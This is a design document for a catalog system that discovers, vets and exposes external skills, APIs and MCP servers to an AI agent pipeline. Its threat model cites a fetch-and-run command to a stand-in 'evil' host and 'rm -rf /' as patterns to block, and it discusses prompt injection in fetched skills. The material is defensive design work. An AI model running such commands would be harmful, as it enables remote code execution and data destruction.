# Yalayut — Skills, APIs, MCPs Catalog

**Status**: design (brainstorming + recon complete, pre-plan)
**Date**: 2026-05-09 (recon 2026-05-11; brainstorm sweep 2026-05-14)
**Owner**: KutAI core

## Problem

KutAI's i2p (idea-to-product) workflow burns LLM iterations on tasks that have well-known recipes — auth wiring, scaffolds, CRUD, RAG setup, deploy steps. Existing skill subsystem (`src/memory/skills.py`) auto-grows tiny prompt-injection routing hints from successful tasks but cannot import external recipes. Public skill libraries (anthropics/skills, obra/superpowers, wshobson agents, MetaGPT roles, cookiecutter ecosystem) carry far more leverage than current internal hints — but no infrastructure exists to fetch, vet, store, and *correctly* expose them.

Free APIs registry (`src/tools/free_apis.py`) and MCP server discovery face the same shape of problem: external artifacts need discovery, vetting, indexing, exposure to agents, effectiveness telemetry. Today each is bespoke or absent.

Two gaps surfaced in v1 review and a real-world recon (`docs/superpowers/specs/2026-05-11-yalayut-recon.md`) reshape this design:

1. **Vetting at scale** — naive "per-artifact human approve" gate collapses under realistic discovery volumes (public-apis ~1.4k, awesome-mcp-servers ~1k, github_topic open-ended). Need tiered classifier + auto-checks + source-scout-with-founder-curate pattern.
2. **Exposure rework** — pure "match → inject text / register tool" path leaves leverage on the floor. Real benefit needs a small set of exposure classes (inject / tool / preempt / sandbox / quarantine) plus a dedicated thin **intersect** component that owns matching + exposure decisions, so yalayut stays a pure catalog and Beckman stays pure task-lifecycle.

## Goals

- Lazy fetch + apply external recipes per mission (no wholesale registry vendoring)
- Vetted catalog with auditable trust chain at multiple granularities (source / owner / artifact / check)
- Pluggable sources (extensible across registries)
- Unified lifecycle for skills, APIs, MCPs (and future artifact types)
- Recipes that can fast-forward whole scaffolding processes via mechanical preempt
- Skills exposed the right way: mechanical preempt, pre-bound concrete calls, scoped tools, or prompt injection (agent prompt or grader prompt) — not just inert context text
- Autonomous source-scout + founder-curate flow: KutAI watches the world, founder swipes proposals

## Non-goals (v1)

- Migrating `src/tools/free_apis.py` onto the framework (audit + migrate separately; framework must fit it but not gate on it)
- Mid-mission *trust elevation* (artifacts queued mid-mission still wait for next planning sweep before activation)
- Headless-browser scraping for ClawHub / SkillHub (catalogs unscrapeable today)
- Public distribution of KutAI-authored skills
- LLM-assisted prompt-injection vetting beyond regex scan (v1.1)

## Locked design decisions (brainstorm output)

### Threat model

Ranked for KutAI's surface (local Windows, shell + file + git push + cloud-API tokens + Telegram identity):

| Threat | Severity | Frequency | Strategy |
|---|---|---|---|
| Malicious shell (`curl evil.sh \| bash`) | high | low | shell-bin allowlist + sandbox tier |
| Prompt injection (body hijacks agent) | high | low–med | regex scan + body-size cap + T3 on hit |
| Supply chain (compromised npm/docker) | high | low | sha256 pin on MCP install |
| Network exfil (api endpoint = attacker) | med | low | domain allowlist + `call_api` redaction (existing) |
| Quality rot (recipe wrong/outdated) | low | **high** | telemetry-driven auto-disable + source decay |
| License contamination | low | low | manifest field, no enforcement (KutAI is private) |

### Source granularity

`repo+path` is the unit (e.g. `github:anthropics/skills@/skills`). No commit-pinning by default. **Trust attaches to owner** separately from source — awesome-list adapters discover child artifacts under various owners; trust check is `child.owner ∈ trusted_owners` not `source.id ∈ trusted_sources`.

### Trust feedback

- Per-artifact: rolling success rate <30% over N invocations → `enabled=0` + Telegram nag
- Source-aggregate: weighted avg of artifact success rates per source → trust score drift; below threshold → source `pin_policy` bumps tighter, future bumps re-vet at T2 minimum
- Owner-aggregate: same for owner
- **Promotion always manual** via `/yalayut source promote <id>` or `/yalayut owner promote <name>` (no auto-trust-from-stars; stargazer is broken signal per recon)
- Vetted artifacts never deleted; can be re-enabled

### Discovery model

- **Cron** for trusted sources (curated, ~tens of artifacts/source)
- **On-demand** for untrusted catalogs (volume-dangerous; only pulled when demand signal fires)
- **Source-scout** runs autonomously, proposes new sources to founder via Telegram cards (never auto-adds sources)
- Per-source `discovery_mode ∈ {cron, on_demand, both}`, per-source rate limit, per-day candidate cap

### Demand signals (when to fire on-demand discovery)

Two tiers, both feed same `DemandSignal` queue with confidence stacking + dedupe by `source_step_pattern` (embedding-hashed) + cooldown:

**Proactive** (decision boundaries, primary driver):
1. **Planning sweep** — i2p workflow expands a mission, intersect runs per step during expansion; gaps trigger fetch before any agent runs
2. **Step entry** — intersect runs at step start; below-θ on recipe-eligible step fires on-demand query
3. **Agent tool-callable** — `yalayut.check(intent)` exposed as ReAct tool; agent self-serves mid-iteration
4. **Founder-initiated** — `/yalayut discover "<intent>"` ad-hoc

**Reactive** (backstop):
5. **Explicit `recipe_hint` miss** — step JSON carries `recipe_hint`; `yalayut.query` returns nothing above τ
6. **DLQ** — step exhausted retries; signal "something is missing"
7. **Repeat-pattern across missions** — same embedded step description appears K times with no high-match score

Confidence stacks across signals; D+C+E on same pattern = high priority, single E alone = backlog.

### Tier classifier

Each artifact lands in one of T0..T3 via **owner-elevated source cap min-with checks**:

```
# tiers are integers: T0=0 (best/most privilege) .. T3=3 (quarantine).
trust_cap  = min(source_max, owner_max)       # owner elevates source — lower int = more privilege
final_tier = max(trust_cap, *check_maxes)     # most-restrictive (highest int) wins; checks always cap
```

- `SOURCE_MAX[trusted]=T0, [review]=T1, [untrusted]=T2` — automated source-level trust
- `OWNER_MAX` per row in `yalayut_owners`, founder-controlled
- Owner can **elevate** a sketchy source (B-style) only when founder has explicitly approved the owner via Telegram **after reading sample artifacts** that source-scout surfaced. KutAI never auto-promotes owners. The "read + approve" interaction is the source-scout card: founder sees sample manifests + bodies, taps `[Trust owner]`, all future sources from that owner inherit the elevation.
- Auto-checks still cap independently — owner elevation cannot bypass a failed shell_allowlist or injection_scan
- Audit row stored per vetting decision with each cap's contribution (`source_max`, `owner_max`, per-check max tiers)

Auto-checks (gate-zero, run on every artifact regardless of source trust):

| Check | Pass behavior | Fail behavior |
|---|---|---|
| schema_valid | T0 | T3 |
| body_size_ok (skill ≤50KB, hint ≤5KB) | T0 | T2 |
| shell_allowlist (first token in cmd) | T0 if known | T2 if unknown, T3 if blocked |
| network_scope (network endpoints only in `api` kind) | T0 | T1 if cross-kind |
| mcp_pinned (sha256 of npm tarball / docker digest) | T0 if pinned | T2 unpinned |
| injection_scan (regex set) | T0 | T3 on hit |
| license_present | T0 | T2 |
| diff_size (re-fetch) | T0 if first or <30% body change | T1 medium, T2 large |
| windows_compat (chmod/sudo/apt/raw .sh/symlink) | T0 | T2 (mechanizable=false), T3 if `rm -rf /` style |

Tier → exposure ceiling (intersect floors based on task confidence):

| Tier | Eligible exposure classes |
|---|---|
| T0 | inject, tool, preempt |
| T1 | inject, tool (no preempt) |
| T2 | sandbox, inject-with-warning *(v1.1; v1 treats T2 as quarantine until founder-promoted)* |
| T3 | quarantine only |

### Auto-check policy ownership

DB-only (no static YAML), seeded by migration. KutAI proposes additions via `yalayut_policy_proposals` table; founder approves via Telegram. Same pattern across all lists: shell_allowlist, domain_allowlist, injection_regexes, mcp_pin_policy. Audit row per change.

### Exposure classes (5 total)

A skill is matched, then exposed one of 5 ways. The intersect decides the class; the consumer places it.

| Class | What | Decided by | Consumed by |
|---|---|---|---|
| `inject` | skill content placed into a prompt. Render variants: prose hint / pre-bound concrete call ("prebind") / checklist. Subsumes old context + role_swap + rubric — all are "applicable skill text in a prompt", the only difference is which prompt and how rendered. | intersect | coulson (agent prompt) or `grade_task` (grader prompt) |
| `tool` | register a callable scoped to this task (API verb / MCP tool / callable skill); not in the global tool list | intersect | coulson tool registry |
| `preempt` | recipe runs mechanically, no LLM; intersect routes task to mechanical lane | intersect | mr_roboto |
| `sandbox` | preempt but dry-run; first run produces a diff founder approves (T2). **v1.1** — v1 keeps T2 quarantined-until-promoted | intersect | mr_roboto |
| `quarantine` | never exposed (T3) | — | — |

**Why role_swap and rubric are not classes.** An `agent_config` artifact ("you are a backend architect…") is just skill content that, when applicable, changes the agent prompt — coulson injects it like any other skill. A checklist skill ("verify error handling") is skill content applicable to *grading* tasks — `grade_task` injects it into the grader prompt. Both are `inject`; the only variable is which prompt-builder does the placing. No separate fatih_hoca hook, no finish-gate plugin.

**`applies_to`.** Each artifact carries `applies_to ∈ {execution, grading}` (inferred from kind: `agent_config`/`shell_recipe`/`procedure` → execution; checklist-shaped `prompt_skill` → grading; plain `prompt_skill` → execution). The intersect tags each `SkillApplication` with it; coulson consumes the `execution` slice, `grade_task` consumes the `grading` slice. **v1 ships `execution` only** — `grading` exposure (rubric-into-`GRADING_PROMPT`) is v1.1; v1 tags everything `execution` and `grade_task` is untouched.

### Prebind — a render mode of `inject` (not a class)

When an `inject` exposure carries a parametric recipe (`shell_recipe` / `procedure` with `inputs_schema`), the intersect can render it as a **pre-bound concrete call** instead of prose — "prebind". Same exposure class (`inject`), better rendering: the agent sees `wasp-saas-init({name: workout-tracker, db: postgres})` to confirm rather than a tool to figure out.

Arg-binding pipeline (owned by the intersect), multi-tier short-circuits:

```
for each matched parametric artifact:
  - try static bind_from paths → fill from task_ctx
  - if all fields filled: render prebind, 0 LLM
  - if any null: check bind_cache (embedding-keyed)
  - if cache hit ≥ 0.92: reuse args, render prebind, 0 LLM
  - else: [v1]   leave unbound → fall back to plain prose `inject`
          [v1.1] beckman.enqueue(BindTask, await_inline, lane=overhead)
                 → small model, constrained decode against inputs_schema
```

**v1 cut**: no LLM-bind. Binding is static `bind_from` + cache only. A cold partial-static cache-miss does **not** call an LLM — the artifact is exposed as plain prose `inject` instead of a pre-bound call. LLM-bind (the `BindTask` overhead-lane path) is v1.1; it's the only thing that would make intersect import `beckman.enqueue`, so deferring it keeps intersect's import surface at just yalayut.

Cost ladder (v1):
- No match → 0 LLM
- Match + all-static-bindable → 0 LLM, prebind render
- Match + cache hit → 0 LLM, prebind render
- Match + cold cache-miss → 0 LLM, prose-inject render (no prebind)

`preempt` reuses the same static binding pipeline; a preempt recipe with unbound required fields downgrades to `inject` rather than running with holes.

### Manifest synthesis (most artifacts in the wild lack yalayut format)

Recon finding: 99% of public artifacts ship their own native format (SKILL.md frontmatter, cookiecutter.json, README bullets, table rows). Yalayut-format YAML with `inputs_schema.foo.bind_from: [...]` is **internal** — adapters synthesize it.

**Hybrid seed + synthesis**:
- **Seed manifests** — hand-authored in `packages/yalayut/seed/manifests/*.yaml` for top 20 known-good recipes (see Seed list below). T0, mechanizable=true where applicable, pristine `bind_from` paths.
- **Adapter parsers** for structured sources (anthropics SKILL.md frontmatter, cookiecutter.json, public-apis table rows) — mechanical, no LLM
- **LLM synthesis fallback** for unstructured sources (awesome-list bullets, freeform README) — Sonnet, ~700 tokens/artifact, ~$0.20–$1/month total at projected volume
- **Naming**: `name_original` preserves upstream raw name; `name` is canonical `<source-slug>-<original>` (with rules to avoid `matlab-matlab-live-script` style); yalayut indexes BOTH into the query embedding

Synthesized artifacts default to T1/T2 (cannot reach T0 unless seed or canonical SKILL.md frontmatter source).

## Artifact types

| Type | Schema shape | Activation cost | Dominant exposure class (per recon) |
|---|---|---|---|
| skill | manifest + body + assets | none | `inject` (prompt_skill dominant in wild); `preempt` for the rare mechanizable shell_recipe |
| api | endpoint + auth + rate_limit | none | `tool` (per-step budget cap ≤3) |
| mcp | server cmd + env + tool list | process lifecycle | `tool` (on-demand process start + idle shutdown) |

Skill kinds:
- `internal_hint` — auto-grown routing hint (current `skills.py` content); body inline
- `prompt_skill` — markdown SKILL.md (anthropics/obra convention); dominant kind in the wild
- `shell_recipe` — invocation steps (cookiecutter, npx scaffolds) + post-patch; rare in wild, mostly seeded
- `procedure` — ordered tool chain
- `agent_config` — sys_prompt + tool list + optional `model_hint` (wshobson/MetaGPT style)

## Architecture

### Package layout (mutable; firm at module-responsibility level)

Two packages: `yalayut` (pure catalog) and `intersect` (thin match+expose layer).

```
packages/yalayut/                # pure catalog: discover, vet, index, store, query
  schema.py            # DB tables, manifest types
  contracts.py         # Plugin protocol (DiscoveryPlugin + AccessPlugin + SourceAdapter)
  trust.py             # source/owner allowlist, trust scoring, decay
  index.py             # storage + read API
  query.py             # query(task_ctx) -> ranked [Artifact]  (vector sim over embedding)
  tier_classifier.py   # source-cap × check-caps → min-tier
  executor.py          # run_recipe — recipe execution (called by mr_roboto path)
  vetting/
    auto_checks.py     # 9 gate-zero checks
    policy.py          # DB-backed allowlists + proposal flow
    source_review.py   # collapsed per-source weekly digest
  discovery/
    cron.py            # daily run (trusted sources)
    on_demand.py       # need-driven query
    source_scout.py    # autonomous candidate-source proposal
    fetch.py           # staging → vendor/ on approve
    synthesize.py      # adapter-parse + LLM-fallback manifest generation
    sources/
      github_path.py
      github_topic.py
      awesome_list_md.py
      cookiecutter_template.py
      public_apis_md.py
      web_markdown.py
      clawhub_api.py     # stub
  plugins/
    skill.py
    api.py
    mcp.py
  seed/
    manifests/         # hand-authored top-20 seed manifests

packages/intersect/             # thin: per-task match → exposure decision
  flash.py             # entry: flash(task) → attach SkillApplication / route preempt
  scoring.py           # confidence = vector_sim × source_trust × owner_trust × hint_bonus
  exposure.py          # (tier × kind × confidence) → exposure class
  binding.py           # prebind arg pipeline + bind cache
  budget.py            # api/mcp budget caps
  telemetry.py         # yalayut_usage writes, exposure-class A/B
```

Subdirs are guidance; implementation may resplit if a cleaner cut emerges. The hard line: yalayut never renders prompts or decides exposure; intersect never does DB discovery or vetting.

### Data model

**Disk** (`vendor/skills/<source>/<name>/v<version>/`):
- `manifest.yaml` — typed metadata (synthesized or seeded)
- `SKILL.md` or `body.md` — body (for skill artifact)
- `assets/` — optional helper files (scripts, templates)

**DB** (single unified index):

```sql
CREATE TABLE yalayut_index (
  id INTEGER PRIMARY KEY,
  artifact_type TEXT NOT NULL,    -- 'skill' | 'api' | 'mcp'
  kind TEXT,                      -- skill sub-type; null for api/mcp
  source TEXT NOT NULL,           -- 'github:anthropics/skills@/skills'
  owner TEXT,                     -- 'anthropics' (separate from source for owner-allowlist)
  name TEXT NOT NULL,             -- canonical '<source-slug>-<original>'
  name_original TEXT,             -- upstream raw name (for user-query matching)
  version TEXT NOT NULL,
  manifest_path TEXT,             -- null for inline (internal_hint)
  body_excerpt TEXT,              -- first ~500 chars for embedding
  embedding BLOB,                 -- vector (multilingual-e5-base, 768d)
  vet_tier INTEGER,               -- 0..3
  exposure_class TEXT,            -- 'inject'|'tool'|'preempt'|'sandbox'|'quarantine'
  applies_to TEXT,                -- 'execution'|'grading' (inferred from kind)
  vet_state TEXT,                 -- legacy column kept for migration
  vet_hash TEXT,                  -- content hash at vetting time
  source_max INTEGER,             -- audit: source cap that fed final tier
  check_max_json TEXT,            -- audit: per-check max-tier results
  signature TEXT,                 -- detached sig or commit SHA
  mechanizable BOOLEAN,           -- gate for preemption
  model_hint TEXT,                -- agent_config: pass-through to fatih_hoca
  enabled BOOLEAN DEFAULT 1,
  created_at TIMESTAMP,
  vetted_at TIMESTAMP,
  UNIQUE(source, name, version)
);

CREATE TABLE yalayut_usage (
  id INTEGER PRIMARY KEY,
  artifact_id INTEGER REFERENCES yalayut_index(id),
  task_id TEXT,
  exposure_class TEXT,            -- which path actually fired
  bind_args_json TEXT,            -- for prebind, captured args
  exposed BOOLEAN,
  called BOOLEAN,
  succeeded BOOLEAN,
  latency_ms INTEGER,
  conflict_loser BOOLEAN,         -- same-slot collision: was outranked by sibling
  would_have_used INTEGER,        -- mid-mission escape: artifact id we wanted but couldn't wait for
  escape_reason TEXT,             -- 'awaiting_human' | 'rate_limited' | 'quota_exhausted' | 'hard_cap_10m'
  occurred_at TIMESTAMP
);

CREATE TABLE yalayut_sources (
  id INTEGER PRIMARY KEY,
  source_id TEXT UNIQUE NOT NULL, -- 'github:anthropics/skills@/skills'
  source_type TEXT,               -- adapter name
  endpoint TEXT,
  auth_env TEXT,
  trust_score REAL DEFAULT 0.3,
  pin_policy TEXT DEFAULT 'minor',-- 'none' | 'minor' | 'major' | 'commit'
  discovery_mode TEXT DEFAULT 'on_demand',  -- 'cron' | 'on_demand' | 'both'
  trusted BOOLEAN,
  enabled BOOLEAN DEFAULT 1,
  last_run_at TIMESTAMP,
  min_interval_s INTEGER          -- rate limit between runs
);

CREATE TABLE yalayut_owners (
  owner_id TEXT PRIMARY KEY,      -- 'anthropics', 'obra', 'wshobson', ...
  trust_score REAL DEFAULT 0.3,
  allowed_artifact_types TEXT,    -- JSON array
  source_count INTEGER,           -- denormalized: count of distinct sources from this owner
  rolling_success_rate REAL,      -- for decay
  notes TEXT
);

CREATE TABLE yalayut_disabled_imports (
  id INTEGER PRIMARY KEY,
  source TEXT NOT NULL,
  artifact_name TEXT NOT NULL,
  reason TEXT,                    -- 'duplicates_vecihi' | 'self_ref' | 'win_incompat' | ...
  added_at TIMESTAMP,
  UNIQUE(source, artifact_name)
);

CREATE TABLE yalayut_bind_cache (
  id INTEGER PRIMARY KEY,
  manifest_id INTEGER REFERENCES yalayut_index(id),
  ctx_embedding BLOB,             -- embed(json of relevant task_ctx fields)
  bound_args_json TEXT,
  hit_count INTEGER DEFAULT 0,
  created_at TIMESTAMP,
  last_used_at TIMESTAMP
);

CREATE TABLE yalayut_mcp_processes (
  artifact_id INTEGER PRIMARY KEY REFERENCES yalayut_index(id),
  pid INTEGER,
  port INTEGER,
  started_at TIMESTAMP,
  last_used_at TIMESTAMP,
  idle_timeout_s INTEGER DEFAULT 300
);

CREATE TABLE yalayut_policy (
  id INTEGER PRIMARY KEY,
  check_name TEXT NOT NULL,       -- 'shell_allowlist' | 'domain_allowlist' | 'injection_regex' | 'mcp_pin_policy'
  key TEXT NOT NULL,              -- e.g. 'wasp' for shell_allowlist
  value TEXT,                     -- 'allow' | 'deny' | regex pattern
  added_by TEXT,                  -- 'seed' | 'founder' | 'auto_proposal'
  added_at TIMESTAMP,
  UNIQUE(check_name, key)
);

CREATE TABLE yalayut_policy_proposals (
  id INTEGER PRIMARY KEY,
  check_name TEXT NOT NULL,
  key TEXT NOT NULL,
  proposed_value TEXT,
  evidence_json TEXT,             -- artifacts observed, success counts, etc.
  state TEXT DEFAULT 'pending',   -- 'pending' | 'approved' | 'rejected'
  proposed_at TIMESTAMP,
  decided_at TIMESTAMP
);

CREATE TABLE yalayut_source_candidates (
  id INTEGER PRIMARY KEY,
  candidate_source_id TEXT,
  source_type TEXT,
  endpoint TEXT,
  metadata_json TEXT,             -- description, sample artifact, stargazer count (informational only)
  state TEXT DEFAULT 'pending',
  proposed_at TIMESTAMP,
  decided_at TIMESTAMP
);

CREATE TABLE yalayut_demand_signals (
  id INTEGER PRIMARY KEY,
  source_step_pattern TEXT,       -- embedding-hashed step signature
  intent_keywords_json TEXT,
  signal_type TEXT,               -- 'planning_miss' | 'step_entry_miss' | 'tool_call' | 'founder' | 'hint_miss' | 'dlq' | 'repeat_pattern'
  confidence REAL,
  fired_at TIMESTAMP,
  resulted_in_discovery BOOLEAN
);
```

### Manifest schema (manifest.yaml)

```yaml
name: cc-django                          # canonical
name_original: cookiecutter-django       # upstream raw
version: 1.0.0
artifact_type: skill
kind: shell_recipe
source: github:cookiecutter/cookiecutter-django
owner: cookiecutter
license: BSD-3-Clause
mechanizable: true
model_hint: null                          # for agent_config kinds
intent_keywords: [django, web-app, fullstack, celery, docker, postgresql]
inputs_schema:
  project_name:
    type: string
    bind_from: [task.parent_mission.payload.project_name, task.title]
  use_celery:
    type: bool
    bind_from: [task.parent_mission.payload.use_celery]
    default: false
invocation:
  steps:
    - cmd: "uvx cookiecutter gh:cookiecutter/cookiecutter-django"
artifacts: [manage.py, config/settings/base.py]
disabled_imports_check: true              # honor yalayut_disabled_imports
```

Different `artifact_type` values use different optional sections. Plugin parses + validates.

### Plugin contract

```python
class DiscoveryPlugin(Protocol):
    artifact_type: str
    def parse_manifest(self, raw: bytes, source_meta: dict) -> Manifest: ...
    def vet_checks(self, manifest: Manifest, body_path: Path) -> list[Issue]: ...

class AccessPlugin(Protocol):
    """Per-artifact-type query + binding. Lives in yalayut (artifact knowledge).
    Does NOT render prompts — that's the consumer's job."""
    artifact_type: str
    def to_application(self, row: IndexRow, task_ctx: TaskContext) -> SkillApplication: ...
    def bind_args(self, row: IndexRow, task_ctx: TaskContext) -> dict | None: ...    # prebind/preempt
    def execute(self, row: IndexRow, task_ctx: TaskContext, inputs: dict) -> Result: ...  # recipe run

class SourceAdapter(Protocol):
    source_type: str
    async def discover(self, source_cfg: SourceConfig) -> list[ArtifactRef]: ...
    async def fetch(self, ref: ArtifactRef) -> Path: ...
```

Plugins live in `yalayut/plugins/<artifact>.py`. `SkillApplication` is a structured object (artifact ref + exposure class + `applies_to` + payload data) — **not rendered prompt text**. Prompt-builders render it to their own format.

### Lifecycle

1. **Source-scout** (cron, autonomous)
   - Scans: GitHub trending in relevant topics, cross-refs in approved artifacts' READMEs, web search on accumulated demand signals, founder-mentioned URLs
   - Per-day candidate cap (default 5)
   - Output: row in `yalayut_source_candidates` + Telegram card
2. **Source approval** (manual via Telegram)
   - Founder swipes approve-trusted / approve-untrusted / reject / defer
   - Approved → row in `yalayut_sources` with appropriate `discovery_mode` + `trust_score`
3. **Discover**
   - Trusted sources: cron runs daily (or per `min_interval_s`)
   - Untrusted: triggered by demand signal (planning/step-entry/tool-call/founder/hint-miss/DLQ/repeat-pattern)
   - Per-source artifact-cap per run prevents first-run flood
4. **Fetch + synthesize**
   - Source adapter pulls into `vendor/skills/.staging/<source>/<name>/`
   - Adapter parses native format (frontmatter / json / table-row / bullet)
   - LLM synthesis fills gaps where parser can't (Sonnet, constrained-decode against manifest schema)
   - Compute content hash; check against `yalayut_disabled_imports`
5. **Tier classify**
   - Run all auto-checks → collect per-check max tiers
   - Look up source_max + owner_max
   - `trust_cap = min(source_max, owner_max)`; `final_tier = max(trust_cap, *check_maxes)` (see Tier classifier section)
   - Audit row with each cap's contribution
6. **Enable**
   - T0/T1: auto-enable, move staging → `vendor/skills/<source>/<name>/v<version>/`
   - T2: v1 — quarantine-until-founder-promotes (weekly digest review). v1.1 — sandbox-enable (callable, dry-run wrapped)
   - T3: quarantine (`enabled=0`, never surface without `/yalayut requeue`)
   - Embed body excerpt + intent_keywords → `yalayut_index.embedding`
7. **Update**
   - Re-fetch creates `v<n+1>/`; full tier classify re-runs
   - Trusted-source minor bumps with small diff usually stay T0 (diff_size check passes)
   - Major bumps or large diff → re-tier, may demote
8. **Auto-disable**
   - `yalayut_usage.succeeded` rolling rate <30% over N invocations → `enabled=0` + Telegram nag
   - Source trust score decays from artifact-aggregate failures → tighter pin_policy on next bump
   - Owner trust decays similarly
   - Vetted artifacts never deleted

### The intersect (separate thin component)

Matching is **not** yalayut's job (yalayut = pure catalog) and **not** Beckman's job (Beckman = pure task-lifecycle). A dedicated thin component, the **intersect**, owns it.

**Position**: invoked per-task in the orchestrator pump (pump is wiring, ~30 lines; this is wiring, not Beckman internals). Runs once per task, before dispatch.

**Flow**:

```
intersect.flash(task) →
  1. candidates = yalayut.query(task_ctx)
       # yalayut owns the index — vector similarity over embedding
       # (name + name_original), returns ranked [Artifact] with tier/kind/score
  2. score: confidence = vector_sim × source_trust × owner_trust × hint_bonus
       # hint_bonus when step carries recipe_hint
  3. budget caps:
       - artifact_type=api  → ≤3 surfaced per step
       - mcp tools          → ≤3 per server, ≤6 per step total
  4. per candidate, decide exposure_class from (tier × kind × confidence):
       - T0 + shell_recipe + mechanizable + conf ≥ θ_preempt → preempt
       - T2 anything                                         → quarantine in v1 (sandbox is v1.1)
       - T3                                                  → quarantine (drop)
       - else                                                → inject or tool
         (tool when artifact is a callable: api verb, mcp tool, callable skill;
          inject otherwise — prose / prebind render variant)
  5. bind args for preempt + parametric-inject (static only — see Prebind pipeline)
  6. preempt  → route task to mechanical lane (runner=yalayut_recipe)
     others   → attach list[SkillApplication] to task envelope, tagged applies_to
  7. emit decision record → yalayut_usage (exposure_class, bind_args_json)
```

`θ_preempt > θ_inject > θ_tool > θ_min`, tunable, per-source overrides. Defaults conservative; lowered on success-rate telemetry.

**Consumers read the envelope, never call the intersect or yalayut**:
- `coulson` prompt build — reads `SkillApplication`s tagged `applies_to=execution`, renders into agent prompt
- `mr_roboto` — runs the recipe baked into the mechanical task payload
- *(v1.1)* `grade_task` — reads `applies_to=grading` slice, renders into `GRADING_PROMPT`

**Multiple same-slot match conflict** (e.g. 2 `agent_config` skills both applicable to one step): intersect keeps highest-score deterministically; losers logged to `yalayut_usage` with `conflict_loser=true`. `/yalayut stats` surfaces a weekly ambiguity report so founder can tune θ or disable the weaker artifact. No stacking, no fail-loud.

**Failure isolation**: intersect errors → graceful degrade (task proceeds with empty `SkillApplication` list); logged, never propagates.

### API + MCP specifics (beyond shared lifecycle)

api/mcp artifacts live almost entirely in the `tool` exposure class (`inject`/`preempt` are skill-shaped). Five api/mcp-specific behaviors required on top of base:

**1. Auth env-var lifecycle**

- Manifest declares `auth_env: <KEY>` (api) or `mcp.env_required: [KEY1, KEY2]` (mcp)
- At vet time: env presence check writes `env_status` column on `yalayut_index` (`ready` | `missing_<KEY>`)
- At match time: artifacts with `env_status != ready` are filtered from hits (skip silently with telemetry note)
- Founder visibility: `/yalayut auth missing` lists artifacts blocked by missing env; `/yalayut auth set <KEY>=<VALUE>` writes to yalayut-secret table (encrypted at rest via fernet, key in `.env`) and triggers re-vet on affected artifacts
- Periodic re-check (daily cron) catches founder adding env vars manually to `.env`

**2. MCP manifest schema fields**

`artifact_type: mcp` carries a dedicated section:

```yaml
artifact_type: mcp
name: mcp-cloudflare
mcp:
  transport: stdio              # 'stdio' | 'sse' | 'streamable_http'
  install_cmd: "npm install -g mcp-server-cloudflare"  # one-shot, optional
  run_cmd: "npx -y mcp-server-cloudflare"
  env_required: [CLOUDFLARE_API_TOKEN]
  port_hint: null               # for sse/http; null = stdio
  tools_static: []              # known tool names if not dynamic
  tools_discover: true          # call list_tools on first start
  health_check: list_tools      # which call to probe; 'list_tools' default
  idle_timeout_s: 300
```

**3. Tool-name namespacing**

When yalayut registers a tool with coulson/agent context, name format = `<artifact_slug>__<tool>` (double underscore):
- `mcp_cloudflare__list_workers`, `mcp_cloudflare__deploy_worker`
- `skill_cc_django__scaffold` (for skill `tool` exposure)
- `api_coingecko__price` (for api `tool` exposure with manifest-declared verbs)

Collisions impossible across artifacts; logs identify provenance unambiguously. Dispatcher routes by prefix.

**4. Per-MCP tool budget cap**

MCP server can expose many tools (Cloudflare MCP: 20+). Without cap, tool soup returns. Same model as api per-step budget:
- Matcher picks ≤ K_mcp_tools tools per (step, mcp_server) (default K=3)
- Selection: embed each tool's description; rank by similarity to step intent; expose top-K
- Discovered tool descriptions cached in `yalayut_mcp_tools` table on first list_tools call
- Per-step total cap across all MCPs = K_mcp_total (default 6)

**5. MCP health-probe**

- On MCP start: run probe call (`mcp.health_check`, default `list_tools`) within 5s timeout
- Failure → mark `health='unhealthy'` in `yalayut_mcp_processes`, kill process, don't expose tools; Telegram nag
- Success → `health='ready'`, expose selected tools per (4)
- Periodic re-probe every 60s while running; consecutive 3 fails → restart attempt; consecutive 5 fails → mark artifact disabled until founder intervenes
- `/yalayut mcp status` — running servers + health + last_probe_at + tool_count
- `/yalayut mcp restart <id>` / `kill <id>` — manual controls

Aligns with `no_auto_connect` rule: no MCP starts at KutAI boot. Matcher-triggered start only.

**Additional schema**:

```sql
ALTER TABLE yalayut_index ADD COLUMN env_status TEXT DEFAULT 'ready';  -- 'ready' | 'missing_<KEY>'
ALTER TABLE yalayut_mcp_processes ADD COLUMN health TEXT DEFAULT 'starting';  -- 'starting' | 'ready' | 'unhealthy'
ALTER TABLE yalayut_mcp_processes ADD COLUMN last_probe_at TIMESTAMP;
ALTER TABLE yalayut_mcp_processes ADD COLUMN consecutive_probe_fails INTEGER DEFAULT 0;

CREATE TABLE yalayut_mcp_tools (
  id INTEGER PRIMARY KEY,
  artifact_id INTEGER REFERENCES yalayut_index(id),
  tool_name TEXT NOT NULL,
  description TEXT,
  description_embedding BLOB,
  input_schema_json TEXT,
  first_seen_at TIMESTAMP,
  UNIQUE(artifact_id, tool_name)
);

CREATE TABLE yalayut_secrets (
  id INTEGER PRIMARY KEY,
  key_name TEXT UNIQUE NOT NULL,
  encrypted_value BLOB,           -- fernet, key in .env KATALOG_SECRET_KEY
  added_at TIMESTAMP,
  last_used_at TIMESTAMP
);
```

### Mid-mission demand-signal timing (Lock 1)

When step-entry (#2) or agent-tool-call (#3) fires demand signal mid-mission and discovery+vet must complete before the artifact can be used:

- **Default**: step **stalls** until artifact ready. Few-minute waits are cheap compared to burning LLM iterations on a missing recipe.
- **Escape A — `awaiting_human`**: pipeline state hits T2 escalation queue (founder approval needed for that artifact). Don't stall; step proceeds without recipe, artifact queued for next mission's planning sweep.
- **Escape B — `rate_limited` / `quota_exhausted`**: GitHub API rate limit, overhead-lane quota burn, etc. Don't stall; queue for next mission.
- **Hard cap**: 10 minutes wall-clock regardless of state. Step proceeds without recipe (failsafe).
- **Telemetry**: when step proceeds via escape or cap, log to `yalayut_usage` with `would_have_used=<artifact_id>, escape_reason=<state>`. Post-mortem can see missed-leverage cases.

Planning-sweep (#1) demand signals never stall a step (they fire during expansion, before agent starts). Founder-initiated (#4) is interactive — founder waits on `/yalayut discover` directly.

### Source adapters (6, not 5)

| Adapter | Sources | Parser | Confidence |
|---|---|---|---|
| `github_path` | anthropics/skills, obra/superpowers, wshobson/agents, matlab/skills | YAML-frontmatter mechanical | 0.95 |
| `github_topic` | topic-search results | mechanical list + LLM per-artifact | 0.6 |
| `awesome_list_md` | awesome-mcp-servers, awesome-agent-skills | regex-bullet + LLM-normalize | 0.55 |
| `public_apis_md` | public-apis/public-apis | table-parser mechanical | 0.9 |
| `cookiecutter_template` | individual cookiecutter repos | `cookiecutter.json` parse | 0.85 |
| `web_markdown` | generic SKILL.md URL | frontmatter mechanical | 0.9 |
| `clawhub_api` | future | stub | n/a |

